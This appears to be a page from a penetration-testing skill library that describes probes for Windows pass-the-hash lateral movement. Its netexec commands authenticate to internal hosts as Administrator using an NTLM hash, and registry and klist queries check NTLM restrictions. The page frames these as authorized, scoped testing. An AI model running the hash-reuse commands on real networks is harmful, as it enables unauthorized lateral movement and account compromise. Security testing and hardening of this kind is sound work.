# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`windows-lateral-movement-pass-the-hash-and-ticket`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Probes owned by `windows-lateral-movement-pass-the-hash-and-ticket`. Each one reads state or makes a single benign authorized request: none writes, escalates, or persists. Record the benign baseline first, then compare the differential stated with the probe.

## Applicability across hosts

**Expected differential.** A successful logon on a second host proves reuse; a failure proves unique passwords or a policy block.

```bash
netexec smb 10.20.30.21 -u Administrator -H <hash>
netexec smb 10.20.30.22 -u Administrator -H <hash>
```

## NTLM policy state

**Expected differential.** `RestrictSendingNTLMTraffic` of 2 proves outbound NTLM is blocked, which removes the hash path from that host.

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0' /v RestrictSendingNTLMTraffic
klist -e
```

## Usage Rules

- Run only inside the scope named in the engagement letter or lab charter.
- Change one variable per probe so the differential is attributable to one control.
- Pair every confirmed finding with the structural fix in [`SKILL.md`](SKILL.md).
